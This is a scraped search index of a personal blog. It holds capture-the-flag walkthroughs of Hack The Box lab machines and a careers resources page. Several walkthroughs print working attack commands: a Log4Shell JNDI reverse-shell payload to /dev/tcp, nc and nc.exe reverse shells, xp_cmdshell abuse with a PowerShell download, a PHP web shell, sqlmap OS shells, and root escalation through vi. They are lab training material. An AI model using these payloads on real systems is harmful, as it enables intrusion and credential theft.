2024","externalUrl":null,"permalink":"/categories/starting-point/","section":"Categories","summary":"","title":"Starting Point","type":"categories"},{"content":"","date":"25 September 2024","externalUrl":null,"permalink":"/categories/tier2/","section":"Categories","summary":"","title":"Tier2","type":"categories"},{"content":"\rINtroduction #\rTask 1 #\rWhich are the first four open ports?`\n┌──(n00b㉿v1c70r)-[~/starting point] └─$ nmap -sCV -A 10.129.211.32 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-26 07:03 EAT Nmap scan report for 10.129.211.32 Host is up (0.25s latency). Not shown: 996 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 6789/tcp open ibm-db2-admin? 8080/tcp open http-proxy |_http-title: Did not follow redirect to https://10.129.211.32:8443/manage |_http-open-proxy: Proxy might be redirecting requests | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 404 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 431 | Date: Thu, 26 Sep 2024 04:05:01 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 404 | Found\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 404 | Found\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | GetRequest, HTTPOptions: | HTTP/1.1 302 | Location: http://localhost:8080/manage | Content-Length: 0 | Date: Thu, 26 Sep 2024 04:05:00 GMT | Connection: close | RTSPRequest: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Thu, 26 Sep 2024 04:05:01 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 | Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; | Socks5: | HTTP/1.1 400 | Content-Type: text/html;charset=utf-8 | Content-Language: en | Content-Length: 435 | Date: Thu, 26 Sep 2024 04:05:02 GMT | Connection: close | \u0026lt;!doctype html\u0026gt;\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP Status 400 | Request\u0026lt;/title\u0026gt;\u0026lt;style type=\u0026#34;text/css\u0026#34;\u0026gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP Status 400 |_ Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 8443/tcp open ssl/nagios-nsca Nagios NSCA | ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US | Subject Alternative Name: DNS:UniFi | Not valid before: 2021-12-30T21:37:24 |_Not valid after: 2024-04-03T21:37:24 | http-title: UniFi Network |_Requested resource was /manage/account/login?redirect=%2Fmanage 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8080-TCP:V=7.94SVN%I=7%D=9/26%Time=66F4DD6C%P=x86_64-pc-linux-gnu%r SF:(GetRequest,84,\u0026#34;HTTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8 SF:080/manage\\r\\nContent-Length:\\x200\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x20202 SF:4\\x2004:05:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(HTTPOptions,84 SF:,\u0026#34;HTTP/1\\.1\\x20302\\x20\\r\\nLocation:\\x20http://localhost:8080/manage\\r\\n SF:Content-Length:\\x200\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x202024\\x2004:05:00\\ SF:x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026#34;)%r(RTSPRequest,24E,\u0026#34;HTTP/1\\.1\\x SF:20400\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Langua SF:ge:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x2020 SF:24\\x2004:05:01\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt; SF:\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93 SF:\\x20Bad\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-fam SF:ily:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white SF:;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-s SF:ize:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x2 SF:0{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;borde SF:r:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\ SF:x20Bad\\x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;)%r(FourOhFourRequest,24A,\u0026#34;HTTP/1\\ SF:.1\\x20404\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-La SF:nguage:\\x20en\\r\\nContent-Length:\\x20431\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x SF:202024\\x2004:05:01\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20h SF:tml\u0026gt;\u0026lt;html\\x20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80 SF:\\x93\\x20Not\\x20Found\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-f SF:amily:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:whi SF:te;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font SF:-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\ SF:x20{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;bor SF:der:none;}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20404\\x20\\xe2\\x80\\x9 SF:3\\x20Not\\x20Found\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;)%r(Socks5,24E,\u0026#34;HTTP/1\\.1\\x20400\\x SF:20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20 SF:en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Thu,\\x2026\\x20Sep\\x202024\\x200 SF:4:05:02\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;!doctype\\x20html\u0026gt;\u0026lt;html\\x SF:20lang=\\\u0026#34;en\\\u0026#34;\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad SF:\\x20Request\u0026lt;/title\u0026gt;\u0026lt;style\\x20type=\\\u0026#34;text/css\\\u0026#34;\u0026gt;body\\x20{font-family:Tah SF:oma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;backgr SF:ound-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16p SF:x;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color SF::black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;border:none; SF:}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\ SF:x20Request\u0026lt;/h1\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 244.18 seconds 22,6789,8080,8443\nTask 2 #\rWhat is the title of the software that is running running on port 8443?\nUniFi Network\nTask 3 #\rWhat is the version of the software that is running?\n6.4.54\nTask 4 #\rWhat is the CVE for the identified vulnerability?\nSearch for “Unify 6.5.4 CV” and will have some sites that talk about : CVE-2021–44228. I found this article : https://www.sprocketsecurity.com/resources/another-log4j-on-the-fire-unifi very interesting. CVE-2021–44228\nTask 5 #\rWhat protocol does JNDI leverage in the injection?\nTask 6 #\rWhat tool do we use to intercept the traffic, indicating the attack was successful?\ntcpdump\nTask 7 #\rWhat port do we need to inspect intercepted traffic for?\nThe protocol use for injection is LDAP, so the port to inspect is the default port of LDAP which is 389. Task 8 #\rWhat port is the MongoDB service running on?\nThe mongoDB service is an internal process. We first try to take the control of the machine by exploiting the CVE : CVE-2021–44228.\nFirst step is to download a tool that will help us to exploit the previous vulnerabilities.\nwget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar Once the tool is download, use the following code to open an LDAP server on your attack box. Note that you have to change the IP address by yours\njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;nc IP_ADDRESS PORT -e /bin/sh\u0026#34; -A \u0026#34;IP_ADDRESS\u0026#34; The output will be similar to this\nThe second step is to open a netcat listener in our attack box. 4444 here is my chosen port.\nnc -lvp 4444 The third step is to intercept a login request with burpsuite and tamper with it, By adding our payload. Replace the URL with the one which is return in the previous step\nWhen we send out request we got an error\nBefore we continue it is important to know if the error it is not because the application is not vulnerable. To verify that, we will use tcpdump to intercept traffic and verify if there is an initiated connection when the previous request is sent.\nStart tcpdump with this command\nsudo tcpdump -i tun0 port 1389 Then re-send the request, and you will have output like this. Mean that application is vulnerable to jndi injection, but we have to build a better payload.\nTo build our payload, we will need maven and open-jdk, in my computer it is installed by default if it is not the case for you, install it.\nClone and build the project with this command line\ngit clone https://github.com/veracode-research/rogue-jndi \u0026amp;\u0026amp; cd rogue-jndi \u0026amp;\u0026amp; mvn package Then, encode to base64 the command we want to inject. Change the IP_ADDRESS by your attack box and PORT by the port you want (it has to be free).\necho \u0026#39;bash -c bash -i \u0026gt;\u0026amp;/dev/tcp/IP_ADDRESS/PORT 0\u0026gt;\u0026amp;1\u0026#39; | base64 Copy the output, it will help in the following\nAfter this, we launch an LDAP server on our attack box. Change the IP_ADDRESS by yours and the base64 code by the previous output\njava -jar rogue-jndi/target/RogueJndi-1.1.jar --command \u0026#34;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuMjM0LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}\u0026#34; --hostname \u0026#34;IP_ADDRESS\u0026#34; We have now to open a listener on a port, we previously choose\nThen, we intercept a login request with burpsuite and add our payload\nSend the request and back to your listener, you are now connected to the victim machine\nOnce connected, we can upgrade the shell to be more interactive\nscript /dev/null -c bash We use the ps -aux command to know processes running\n!\nAnd there is mongodb at the port 27117\nTask 9 #\rWhat is the default database name for UniFi applications?\nConnect to mongo db and list databases\nmongo --port 27117\rshow dbs Task 10 #\rWhat is the function we use to enumerate users within the database in MongoDB?\ndb.admin.find() Task 11 #\rWhat is the function we use to update users within the database in MongoDB?\ndb.admin.update() Task 12 #\rWhat is the password for the root user?\nUse this command to dump all the passwords in the database :\nunifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34;\r\u0026lt;17 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34;\rMongoDB shell version v3.6.3\rconnecting to: mongodb://127.0.0.1:27117/ace\rMongoDB server version: 3.6.3\r{\r\u0026#34;_id\u0026#34; : ObjectId(\u0026#34;61ce278f46e0fb0012d47ee4\u0026#34;),\r\u0026#34;name\u0026#34; : \u0026#34;administrator\u0026#34;,\r\u0026#34;email\u0026#34; : \u0026#34;administrator@unified.htb\u0026#34;,\r\u0026#34;x_shadow\u0026#34; : \u0026#34;$6$nCiz.BUHQGQ8KpZv$pRaZabdm03bPBxVyaG6OKs/dmMASG6DxTC30/IceWjGVeXtBbYshFjuAGOJOJcEQhE4.4x0ETwCS/92wsa7W51\u0026#34;, There is an administrator user, in the x_shadow file it is an SHA-512 hash of the password, you can try to crack it but it nos possible. So we will update the admin user and change it password by a chose one.\nWe generate the hash of new password\nmkpasswd -m sha-512 Password We update the administrator user and add the password of our custom hash with the follow command\nmongo --port 27117 ace --eval \u0026#39;db.admin.update({\u0026#34;_id\u0026#34;:\rObjectId(\u0026#34;61ce278f46e0fb0012d47ee4\u0026#34;)},{$set:{\u0026#34;x_shadow\u0026#34;:\u0026#34;HASH GENERATES\u0026#34;}})\u0026#39; We verify is the update was done\nmongo --port 27117 ace --eval \u0026#34;db.admin.find().forEach(printjson);\u0026#34; And try to connect with username and our custom password\nThe manage console is now open\nJust open the site tab on the settings menu and the password is store in clear text.\nOnce connected, we can get the user flag at the /home/michael folder\nRoot flag is in the /root folder\n","date":"25 September 2024","externalUrl":null,"permalink":"/posts/unified/","section":"Posts","summary":"Unity is key","title":"Unified","type":"posts"},{"content":"\rIntroduction #\rTask 1 #\rBesides SSH and HTTP, what other service is hosted on this box?\nFTP\nTask 2 #\rThis service can be configured to allow login with any password for specific username. What is that username?\nanonymous\nTask 3 #\rWhat is the name of the file downloaded over this service?\nbackup.zip\nTask 4 #\rWhat script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?\nAs seen above we have been able to find the password for the zipped folder, now we can be able to unlock the folder in order to find the contents of the folder\nzip2john Task 5 #\rWhat is the password for the admin user on the website?\nqwerty789\nTask 6 #\rWhat option can be passed to sqlmap to try to get command execution via the sql injection?\n—os-shell\nwe shall try to get a shell from the machine using sqlmap to get our foothold into the machine as shown below\nsqlmap -url=\u0026#34;http://[IP]/dashboard.php?search=new\u0026#34; -cookie=\u0026#34;PHPSESSID=snduj64lg29ger6doubiqid824\u0026#34; --os-shell and we have our foothold into the machine.\nTask 7 #\rWhat program can the postgres user run as root using sudo?\nFor this section we had to run the following command\nsudo -l but we are required to input password for the postgres user in order to get the output, hence I dug around and found the password in the file below.\n/var/www/html/dashboard.php password=P@s5w0rd! Since now we have our password for the postgres user, we can login through ssh\nvi\nnow we can look at gtfobins on how we can exploit vi to get a root shell\nafter logging in, we were able to get our user flag.\nnow to root the machine and pawn it, we had to exploit vi using this procedure form gtfobins.\nvi :set shell=/bin/sh :shell and we have pawned our machine.\n","date":"25 September 2024","externalUrl":null,"permalink":"/posts/vaccine/","section":"Posts","summary":"Some medicine for you.","title":"Vaccine","type":"posts"},{"content":"","date":"25 September 2024","externalUrl":null,"permalink":"/tags/very-easy/","section":"Tags","summary":"","title":"Very Easy","type":"tags"},{"content":"\rIntroduction #\rTask 1 #\rWhich TCP port is hosting a database server?\n1433\nTask 2 #\rWhat is the name of the non-Administrative share available over SMB?\nbackups\nTask 3 #\rWhat is the password identified in the file on the SMB share?\nM3g4c0rp123\nTask 4 #\rWhat script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?\nmssqlclient.py\nTask 5 #\rWhat extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?\nxp_cmdshell\nafter we log in through impacket, we are required to stabilize our shell using the command above as shown below.\nLet us try to gain RCE on this box. Follow these commands in order.\nFollow these steps :\nEXECUTE sp_configure \u0026#39;show advanced options\u0026#39;,1;\rRECONFIGURE;\rEXECUTE sp_configure \u0026#39;xp_cmdshell\u0026#39;,1;\rRECONFIGURE; Now try running :\nxp_cmdshell \u0026#34;whoami\u0026#34; Now it’s working and this command will return us “archetype/sql_svc”.\n(Stable shell):\nOur shell is working but we won’t be executing our commands like this again so we will get a stable shell. Now let’s search and find something.\nAfter some searching we found an article:\nhttps://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/\nWe will follow the last method: xp_cmdshell with nc\nHere first we have to download nc.exe on our local system, which can be downloaded from the link: https://github.com/int0x33/nc.exe/blob/master/nc.exe After downloading let’s set up a python server on our machine in order to send the file to the target system. python3 -m http.server// Keep in mind to run the server in the folder yout nc.exe file is present We will use the following command to get the file on our target system: xp_cmdshell \u0026#34;powershell.exe wget http://[Your_tun0_IP]:8000/nc.exe -OutFile c:\\\\Users\\Public\\\\nc.exe\u0026#34;/*\rwe don\u0026#39;t need the rest of the command because :\r. we already are connected to sql\r. we already logged in using correct credentials\r*/ If our file is successfully transferred we will get something like this in our server instance root@ip-10-10-204-169:~# python3 -m http.server\rServing HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\r10.129.102.63 - - [22/Feb/2022 09:12:04] \u0026#34;GET /nc.exe HTTP/1.1\u0026#34; 200 - The next step is to execute the file in our target system for the reverse shell. So for that first, let’s set up our Netcat listener on our system: nc -lvnp 4444 We will execute the following command in our target system xp_cmdshell \u0026#34;c:\\\\Users\\Public\\\\nc.exe -e cmd.exe [Your_tun0_IP] 4444\u0026#34; So we got our stable shell so our next step is to find the flags. So user flag is in the Dekstop folder and we can navigate to that folder :\ncd \\\rcd Users\rcd sql_svc\rcd Desktop\rtype user.txt Task 6 #\rWhat script can be used in order to search possible paths to escalate privileges on Windows hosts?\nwinpeas.exe\nTask 7 #\rWhat file contains the administrator\u0026rsquo;s password?\nConsoleHost_history.txt\nthe file above contains the credentials of the admin that we can use to escalate our privileges to root the machine.\nUser: administrator Password: MEGACORP_4dm1n!! Now we need a tool to log in as Administrator on our target PC and we cannot do it directly in our Windows Powershell as we do in the Linux system. There is a tool from our impacket named psexec.py which will help us.\nKill the PowerShell and mssqlclient on our machine. Let’s use our tool: python3 /opt/impacket/examples/psexec.py administrator@[Target_IP] next we shall change directory to the desktop directory of admin to get our root flag.\nand just like that, we have pawned our machine.\n","date":"23 September 2024","externalUrl":null,"permalink":"/posts/archetype/","section":"Posts","summary":"Archetype Stuff","title":"Archetype","type":"posts"},{"content":"\rIntroduction #\rTask 1 #\rHow many TCP ports are open?\n2\nTask 2 #\rWhat is the domain of the email address provided in the \u0026ldquo;Contact\u0026rdquo; section of the website?\nthetoppers.htb\nTask 3 #\rIn the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?\n/etc/hosts directory Task 4 #\rWhich sub-domain is discovered during further enumeration?\ns3\nTask 5 #\rWhich service is running on the discovered sub-domain?\nAmazon s3 Task 6 #\rWhich command line utility can be used to interact with the service running on the discovered sub-domain?\nawscli\nTask 7 #\rWhich command is used to set up the AWS CLI installation?\naws configure Task 8 #\rWhat is the command used by the above utility to list all of the S3 buckets?\naws s3 ls Task 9 #\rThis server is configured to run files written in what web scripting language?\nPHP\nfor obtaining the root flag, we had to write a small php code that would prompt a cmdlet for us to get the flag, however, we had to upload the code to the s3 bucket inorder to be able to access it.\nThe code we shall use is as follows.\n\u0026lt;?php system(_$GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; we shall then access the shell.php file form the url in order to get our root flag\nand with that, we have pawned the machine.\n","date":"20 September 2024","externalUrl":null,"permalink":"/posts/three/","section":"Posts","summary":"Why did the S3 bucket break up with the EC2 instance?  Because it found someone with less latency! 😄","title":"Three","type":"posts"},{"content":"","date":"20 September 2024","externalUrl":null,"permalink":"/categories/tier1/","section":"Categories","summary":"","title":"Tier1","type":"categories"},{"content":"\rGetting started #\rHave you ever wondered where to begin when starting a career or shifting to a new path? I\u0026rsquo;ve been there too. I\u0026rsquo;ll outline the routes that helped me advance in cybersecurity, as well as other tech careers you can explore. I\u0026rsquo;ll also highlight paths for those interested in cloud computing with Microsoft, Google Cloud Platform, and AWS—plus blockchain technology.\nCyber Security #\rWhile there are numerous certifications available for various cybersecurity roles, it\u0026rsquo;s crucial to first acquire the fundamental skills necessary for entering the field. These basics include networking, understanding different operating systems (such as Windows and Unix-based systems), and computing essentials. I\u0026rsquo;ll provide resources for learning these foundational skills. Below, you\u0026rsquo;ll find a simple roadmap of certifications that can help you enter the job market. However, it\u0026rsquo;s important to note that certifications themselves are not as crucial as the skills gained while pursuing them.\nlearn Linux fundamental #\rOverthewire bandit war games Learn Windows Fundamentals #\rUnderthewire war games for powershelll mastery Web Fundamentals #\rOverthewire Natas challenge Networks #\rCISCO’s Networking Basics course Intro to Capture The Flag #\rThere are many ways to enter the cybersecurity field, and one effective approach is participating in various Capture The Flag (CTF) competitions. CTFs come in different formats, including jeopardy-style and attack-and-defend. In this section, we\u0026rsquo;ll focus primarily on jeopardy-style CTFs, which feature challenges from diverse categories such as web, forensics, miscellaneous, crypto, reverse engineering, malware analysis, and OSINT (Open Source Intelligence).\nImportantly, beyond solving challenges, participants are often required to create write-ups in blog format. This practice not only hones technical skills but also develops the crucial ability to document findings effectively. Such documentation skills are highly valued in the industry, as they enable professionals to produce comprehensive reports for organizations to assess and evaluate their security posture.\nBelow are more platforms that one can practice and participate in CTF\npicoCTF\nCyberTalents – A Global Platform For Cybersecurity Talents\nletsDefend\nCTFROOM\ncyberranges\nSofia Santos | OSINT and analysis exercise\nVulnhub\nPwn College\nHack this site\n\u0026#x26a1; The above list is not fully exhausted as there are more platforms out there.\nCloud computing #\rMany cloud providers offer certifications to familiarize users with their technologies, including Microsoft, AWS, and GCP (Google Cloud Platform). Additionally, there are platforms that provide CTF-like labs where individuals can practice their cloud computing skills. In this section, we\u0026rsquo;ll outline roadmaps to help you break into AWS, GCP, and Microsoft Azure.\nMicrosoft azure\nAs seen below are the certifications that one requires to become azure cloud practitioner.\nGoogle Cloud Platform\nAs seen below are the certifications that one requires to become google cloud certified practitioner.\nAWS\nAs seen below is a chart highlighting the certifications one is required to have in order to become an AWS cloud practitioner. However, the are CTF-like labs where one can put their skills to the test, these platforms are such as\nCloudgoat aws Flaws Beyond obtaining certifications, it\u0026rsquo;s crucial to continuously practice and hone your skills. This practice helps you stay up-to-date with the latest security issues arising from cloud misconfigurations—vulnerabilities that attackers exploit to access organizational resources. Here are some labs where you can actively learn new skills and develop strategies to counter potential attacks:\nPwnedLabs Block Chain #\rAs the world embraces cryptocurrency, Blockchain technologies are growing rapidly. This swift expansion has led more individuals to explore the field, eager to understand the buzz surrounding Blockchain technology. The best platform I continue to learn from is Cyfrin Updraft, a free hands-on course where learners gain knowledge through practical projects. By the end of the course, participants emerge not only with knowledge and skills but also with a completed project—tangible proof of their work.\nHome | Cyfrin Updraft ","date":"19 September 2024","externalUrl":null,"permalink":"/resources/","section":"Resources","summary":"Blog helping on getting into tech","title":"Resources","type":"resources"},{"content":"\rIntroduction #\rTask 1 #\rWhen visiting the web service using the IP address, what is the domain that we are being redirected to?\nFirst we had to scan the IP for open ports only to find port was open as shown below.\non visiting the web page, we are directed to the following domain.\nunika.htb\nIn order to be able to access the webpage on our machine, we are required to add it to the\netc/hosts directory and now we are able to see the page.\nTask 2 #\rWhich scripting language is being used on the server to generate webpages?\nPHP\nTask 3 #\rWhat is the name of the URL parameter which is used to load different language versions of the webpage?\npage\nTask 4 #\rWhich of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo;\n../../../../../../../../windows/system32/drivers/etc/hosts\nTask 5 #\rWhich of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: \u0026ldquo;french.html\u0026rdquo;, \u0026ldquo;//10.10.14.6/somefile\u0026rdquo;, \u0026ldquo;../../../../../../../../windows/system32/drivers/etc/hosts\u0026rdquo;, \u0026ldquo;minikatz.exe\u0026rdquo;\n//10.10.14.6/somefile\nTask 6 #\rWhat does NTLM stand for?\nNew Technology LAN Manager\nTask 7 #\rWhich flag do we use in the Responder utility to specify the network interface?\n-I\nTask 8 #\rThere are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.\nJohn The Ripper\nTask 9 #\rWhat is the password for the administrator user?\nFor this section, we had to serve a file and set responder ready to catch a credential when the web-server tries to access the file from our machine by exploiting remote file inclusion vulnerability as shown below\nthe file we were serving is called somefile that contains nothing at all\nAfter a while when the web server was trying to access the file from our machine, responder caught some credentials of which seems to be of an admin.\nNow next we shall try to crack the admin hash to get the password for the admin using john the ripper.\nAfter cracking it, we got the password, as seen below.\nbadminton\nTask 10 #\rWe\u0026rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?\nHere we are required to do further enumeration to get the other port that is open\n5985\nFrom the port above, it is clear that we can log in to the machine using evil-winrm to get our root flag.\nour flag was under the user mike’s Desktop as shown below\n","date":"19 September 2024","externalUrl":null,"permalink":"/posts/responder/","section":"Posts","summary":"Why did the hacker bring a map to the server? Because they were trying to locate the LFI and remotely call the RFI! 😄","title":"Responder","type":"posts"},{"content":"\rIntroduction #\rTask 1 #\rWhat Nmap scanning switch employs the use of default scripts during a scan?\n-sC\nTask 2 #\rWhat service version is found to be running on port 21?\nvsftpd 3.0.3\nTask 3 #\rWhat FTP code is returned to us for the \u0026ldquo;Anonymous FTP login allowed\u0026rdquo; message?\n230\nTask 4 #\rAfter connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?\nanonymous\nTask 5 #\rAfter connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?\nGet command but to download all files once, one can use the command mget as seen above.\nTask 6 #\rWhat is one of the higher-privilege sounding usernames in \u0026lsquo;allowed.userlist\u0026rsquo; that we download from the FTP server?\nadmin\nTask 7 #\rWhat version of Apache HTTP Server is running on the target host?\nApache httpd 2.4.41\nTask 8 #\rWhat switch can we use with Gobuster to specify we are looking for specific filetypes?\n-x\nTask 9 #\rWhich PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?\nlogin.php\nAfter checking, the two files we downloaded, we were adble to get the admin and the password for the as seen as seen below.\nwe used the above credentials to log in to the platform and we got our flag.\n","date":"18 September 2024","externalUrl":null,"permalink":"/posts/crocodile/","section":"Posts","summary":"Croco, why did the FTP server break up with the client? Because it just couldn\u0026rsquo;t handle all the passive aggression! 😄","title":"Crocodile","type":"posts"},{"content":"\rIntroduction #\rTask 1 #\rDuring our scan, which port do we find serving MySQL?\n3306\nTask 2 #\rWhat community-developed MySQL version is the target running?\nMariaDB\nTask 3 #\rWhen using the MySQL command line client, what switch do we need to use in order to specify a login username?\n-u from Mysql\nTask 4 #\rWhich username allows us to log into this MariaDB instance without providing a password?\nroot\nTask 5 #\rIn SQL, what symbol can we use to specify within the query that we want to display everything inside a table?\n*\nTask 6 #\rIn SQL, what symbol do we need to end each query with?\n;\nTask 7 #\rThere are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that\u0026rsquo;s unique to this host?\nhtb\nTo get the root flag, we had to enumerate the htb box as shown below and we found our flag.\nWe have two tables, users and config.\nSelecting the data in users, we found nothing of interest, aside form the users\nBut for the config table, we found our flag\n","date":"17 September 2024","externalUrl":null,"permalink":"/posts/sequel/","section":"Posts","summary":"Why did the database administrator break up with the SQL query? Because it had too many joins! 😄","title":"Sequel","type":"posts"},{"content":"\rIntroduction #\rTask 1 #\rWhat does the acronym SQL stand for?\nStructured Query Language\nTask 2 